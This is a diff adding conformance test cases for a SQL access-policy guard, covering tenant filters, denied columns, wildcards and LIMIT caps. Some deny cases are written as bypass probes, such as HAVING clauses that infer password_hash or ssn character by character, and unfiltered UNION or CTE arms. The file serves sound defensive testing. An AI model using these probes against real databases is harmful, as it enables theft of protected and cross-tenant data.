+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_left_join_on_predicate_does_not_satisfy", "sqlg-adapted"]
+  - name: "self join both filtered in ON"
+    sql: "SELECT o2.id FROM orders o1 JOIN orders o2 ON o1.account_id = 42 AND o2.account_id = 42 AND o1.id = o2.id LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_self_join_both_aliases_filtered_via_on_clause"]
+  - name: "CTE body unfiltered"
+    sql: "WITH x AS (SELECT id, account_id FROM orders) SELECT id FROM x WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_cte_body_must_be_filtered"]
+  - name: "UNION arm unfiltered"
+    sql: "SELECT id FROM orders WHERE account_id = 42 UNION SELECT id FROM orders"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_union_each_arm_independently_checked"]
+  - name: "missing context value"
+    sql: "SELECT id FROM orders WHERE account_id = 42 LIMIT 10"
+    context: {}
+    expect: deny
+    codes: [E_CONTEXT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_missing_context_value_is_policy_error"]
+  - name: "denied column"
+    sql: "SELECT password_hash FROM users LIMIT 10"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_column_blocked"]
+  - name: "non-existent / non-allowed column"
+    sql: "SELECT created_at, bogus_col FROM users WHERE id = 1 LIMIT 10"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_non_allowed_column_blocked", "differs-code"]
+  - name: "table not in allowlist"
+    sql: "SELECT * FROM other_table LIMIT 10"
+    expect: deny
+    codes: [E_TABLE_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_table_not_in_allowlist_blocked"]
+  - name: "quoted identifier is a different table: \"Orders\""
+    sql: "SELECT id FROM \"Orders\" WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_TABLE_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_quoted_identifier_not_mistaken_for_policy_table"]
+  - name: "quoted identifier is a different table: \"ORDERS\""
+    sql: "SELECT id FROM \"ORDERS\" WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_TABLE_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_quoted_identifier_not_mistaken_for_policy_table"]
+  - name: "unquoted ORDERS folds to orders"
+    sql: "SELECT id FROM ORDERS WHERE account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_unquoted_pg_folded_table_still_works"]
+  - name: "select star expands to denied catalog columns"
+    sql: "SELECT * FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_select_star_blocked", "differs-code"]
+  - name: "count(*) allowed"
+    sql: "SELECT count(*) FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_count_star_still_allowed"]
+  - name: "count(DISTINCT *) is a PostgreSQL syntax error"
+    sql: "SELECT count(DISTINCT *) FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_PARSE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_count_distinct_star_blocked", "differs-code"]
+  - name: "qualified wildcard: to_jsonb(users.*) FROM"
+    sql: "SELECT to_jsonb(users.*) FROM users WHERE id = 1 LIMIT 10"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_qualified_wildcard_blocked"]
+  - name: "qualified wildcard: row_to_json(users.*) F"
+    sql: "SELECT row_to_json(users.*) FROM users WHERE id = 1 LIMIT 10"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_qualified_wildcard_blocked"]
+  - name: "qualified wildcard: json_agg(u.*) FROM use"
+    sql: "SELECT json_agg(u.*) FROM users u WHERE id = 1 LIMIT 10"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_qualified_wildcard_blocked"]
+  - name: "qualified wildcard: u.* FROM users u WHERE"
+    sql: "SELECT u.* FROM users u WHERE id = 1 LIMIT 10"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_qualified_wildcard_blocked"]
+  - name: "denied column in HAVING 1"
+    sql: "SELECT id FROM users GROUP BY id HAVING bool_or(substr(password_hash, 1, 1) = 'a')"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_column_in_having_blocked"]
+  - name: "denied column in HAVING 2"
+    sql: "SELECT 1 FROM users HAVING max(password_hash) IS NOT NULL"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_column_in_having_blocked"]
+  - name: "denied column in HAVING 3"
+    sql: "SELECT id FROM users GROUP BY id HAVING max(CASE WHEN substr(ssn,1,1) > '5' THEN 1 ELSE 0 END) = 1"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_column_in_having_blocked"]
+  - name: "legitimate HAVING"
+    sql: "SELECT account_id, count(*) FROM orders WHERE account_id = 42 GROUP BY account_id HAVING count(*) > 5 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_legitimate_having_still_allowed"]
+  - name: "unresolved qualifier: public.password_hash F"
+    sql: "SELECT public.password_hash FROM users WHERE id = 1 LIMIT 10"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_unresolved_qualifier_fails_closed", "differs-code"]
+  - name: "unresolved qualifier: bogus.password_hash FR"
+    sql: "SELECT bogus.password_hash FROM users WHERE id = 1 LIMIT 10"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_unresolved_qualifier_fails_closed", "differs-code"]
+  - name: "unresolved qualifier: \"bogus\".password_hash "
+    sql: "SELECT \"bogus\".password_hash FROM users WHERE id = 1 LIMIT 10"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_unresolved_qualifier_fails_closed", "differs-code"]
+  - name: "real alias qualifier: o.id, o.total FR"
+    sql: "SELECT o.id, o.total FROM orders o WHERE o.account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_real_alias_qualifier_still_allowed"]
+  - name: "real alias qualifier: users.id, users."
+    sql: "SELECT users.id, users.name FROM users WHERE id = 1 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_real_alias_qualifier_still_allowed"]
+  - name: "CTE/subquery qualifier: WITH t AS "
+    sql: "WITH t AS (SELECT id, name FROM users WHERE id = 1) SELECT t.id, t.name FROM t LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_cte_and_subquery_qualifiers_still_allowed"]
+  - name: "CTE/subquery qualifier: SELECT s.i"
+    sql: "SELECT s.id, s.name FROM (SELECT id, name FROM users WHERE id = 1) s LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_cte_and_subquery_qualifiers_still_allowed"]
+  - name: "denied column in USING 1"
+    sql: "SELECT u.id FROM users u JOIN users u2 USING (password_hash) LIMIT 1"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_identifier_in_any_position"]
+  - name: "denied column in USING 2"
+    sql: "SELECT u.id FROM users u JOIN users u2 USING (ssn, password_hash) LIMIT 1"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_identifier_in_any_position"]
+  - name: "denied column in USING 3"
+    sql: "SELECT u.id FROM users u JOIN users u2 USING (\"password_hash\") LIMIT 1"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_identifier_in_any_position"]
+  - name: "denied column in USING 4"
+    sql: "WITH x AS (SELECT id FROM users u JOIN users u2 USING (password_hash)) SELECT id FROM x LIMIT 1"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_identifier_in_any_position"]
+  - name: "output alias named like a denied column"
+    sql: "SELECT id AS password_hash FROM users LIMIT 1"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_denied_identifier_in_any_position", "differs"]
+  - name: "direct denied column ref"
+    sql: "SELECT password_hash FROM users LIMIT 1"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_catchall_no_double_flag_on_direct_ref"]
+  - name: "string literal containing a denied column name"
+    sql: "SELECT id FROM users WHERE name = 'password_hash' LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestIdentifiers::test_catchall_no_false_positive_on_literal_value"]
+  - name: "comma join second alias unfiltered"
+    sql: "SELECT o.id FROM orders o, orders o2 WHERE o.account_id = 42"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_cartesian_join_blocked", "differs-code"]
+  - name: "recursive CTE with LIMIT"
+    sql: "WITH RECURSIVE r AS (SELECT 1 AS n UNION SELECT n+1 FROM r) SELECT n FROM r LIMIT 10"
+    expect: deny
+    codes: [E_UNSUPPORTED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_recursive_cte_blocked"]
+  - name: "tenant table requires LIMIT"
+    sql: "SELECT id FROM orders WHERE account_id = 42"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_large_table_requires_limit"]
+  - name: "sibling subquery LIMIT does not satisfy"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 AND id < (SELECT count(*) FROM users LIMIT 1)"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_sibling_subquery_limit_does_not_satisfy"]
+  - name: "inner CTE LIMIT does not satisfy the outermost select"
+    sql: "WITH x AS (SELECT id, total FROM orders WHERE account_id = 42 LIMIT 1000) SELECT id FROM x"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_inner_cte_limit_satisfies", "differs"]
+  - name: "LIMIT ALL"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT ALL"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_limit_all_is_not_effective", "ambiguous"]
+  - name: "LIMIT 0 is a constant within the cap"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT 0"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_limit_zero_does_not_satisfy", "differs"]
+  - name: "FETCH FIRST 10 ROWS ONLY satisfies LIMIT"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 FETCH FIRST 10 ROWS ONLY"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_fetch_first_satisfies_limit"]
+  - name: "FETCH NEXT 10 ROWS ONLY satisfies LIMIT"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 FETCH NEXT 10 ROWS ONLY"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_fetch_first_satisfies_limit"]
+  - name: "FETCH FIRST 1 ROW ONLY satisfies LIMIT"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 FETCH FIRST 1 ROW ONLY"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_fetch_first_satisfies_limit"]
+  - name: "huge OFFSET (no OFFSET cap)"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT 10 OFFSET 99999999"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_excessive_offset_blocked", "differs"]
+  - name: "reasonable OFFSET"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT 10 OFFSET 20"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_reasonable_offset_allowed"]
+  - name: "set operation UNION with top-level LIMIT"
+    sql: "SELECT id FROM orders WHERE account_id = 42 UNION SELECT id FROM orders WHERE account_id = 42 LIMIT 5"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_set_operation_top_level_limit_satisfies_large_table"]
+  - name: "set operation UNION ALL with top-level LIMIT"
+    sql: "SELECT id FROM orders WHERE account_id = 42 UNION ALL SELECT id FROM orders WHERE account_id = 42 LIMIT 5"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_set_operation_top_level_limit_satisfies_large_table"]
+  - name: "set operation INTERSECT with top-level LIMIT"
+    sql: "SELECT id FROM orders WHERE account_id = 42 INTERSECT SELECT id FROM orders WHERE account_id = 42 LIMIT 5"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_set_operation_top_level_limit_satisfies_large_table"]
+  - name: "set operation EXCEPT with top-level LIMIT"
+    sql: "SELECT id FROM orders WHERE account_id = 42 EXCEPT SELECT id FROM orders WHERE account_id = 42 LIMIT 5"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestDosCaps::test_set_operation_top_level_limit_satisfies_large_table"]
+  - name: "sqlg-adapted LIMIT above the cap"
+    sql: "SELECT id FROM orders WHERE account_id = 42 LIMIT 99999"
+    expect: deny
+    codes: [E_LIMIT_TOO_HIGH]
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_limit_exceeds_max_denied", "sqlg-adapted"]
+  - name: "sqlg-adapted LIMIT within the cap"
+    sql: "SELECT id FROM orders WHERE account_id = 42 LIMIT 500"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_limit_within_max_ok", "sqlg-adapted"]
+  - name: "sqlg-adapted non-literal LIMIT"
+    sql: "SELECT id FROM orders WHERE account_id = 42 LIMIT (SELECT 9999999)"
+    expect: deny
+    codes: [E_LIMIT_TOO_HIGH]
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_non_literal_limit_fails_closed", "sqlg-adapted"]
+  - name: "sqlg-adapted LIMIT 9999999999"
+    sql: "SELECT id FROM orders WHERE account_id = 42 LIMIT 9999999999"
+    expect: deny
+    codes: [E_LIMIT_TOO_HIGH]
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_default_max_limit_value_caps_unconfigured_policy", "sqlg-adapted"]
+  - name: "sqlg-adapted non-literal OFFSET (no OFFSET cap)"
+    sql: "SELECT id FROM orders WHERE account_id = 42 OFFSET (SELECT 9999999) LIMIT 1"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_non_literal_offset_fails_closed", "sqlg-adapted", "ambiguous"]
+  - name: "sqlg-adapted set-op OFFSET without LIMIT: UNION"
+    sql: "SELECT id FROM orders WHERE account_id = 42 UNION SELECT id FROM orders WHERE account_id = 42 OFFSET 9999999"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_offset_on_set_op_is_capped", "sqlg-adapted", "differs-code"]
+  - name: "sqlg-adapted set-op OFFSET without LIMIT: INTERSECT"
+    sql: "SELECT id FROM orders WHERE account_id = 42 INTERSECT SELECT id FROM orders WHERE account_id = 42 OFFSET 9999999"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_offset_on_set_op_is_capped", "sqlg-adapted", "differs-code"]
+  - name: "sqlg-adapted set-op OFFSET without LIMIT: EXCEPT"
+    sql: "SELECT id FROM orders WHERE account_id = 42 EXCEPT SELECT id FROM orders WHERE account_id = 42 OFFSET 9999999"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_offset_on_set_op_is_capped", "sqlg-adapted", "differs-code"]
+  - name: "sqlg-adapted max joins within budget"
+    sql: "SELECT a.id FROM orders a JOIN orders b ON a.id = b.id JOIN orders c ON b.id = c.id WHERE a.account_id = 42 AND b.account_id = 42 AND c.account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/unit/test_limits.py::test_max_joins_under_limit_ok", "sqlg-adapted"]
